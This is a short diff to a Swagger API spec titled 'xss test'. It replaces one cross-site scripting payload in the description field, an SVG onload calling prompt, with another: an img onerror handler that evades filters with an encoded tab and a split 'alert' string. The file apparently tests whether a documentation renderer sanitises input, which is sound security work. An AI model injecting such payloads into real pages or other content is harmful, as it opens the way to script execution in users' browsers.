@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: xss test
   description: |
-   123<h1>123</h1><svg/OnLoad="`${prompt``}`">
+   123<h1>123</h1><img src onerror %09=top['ale'%2b'rt']()>
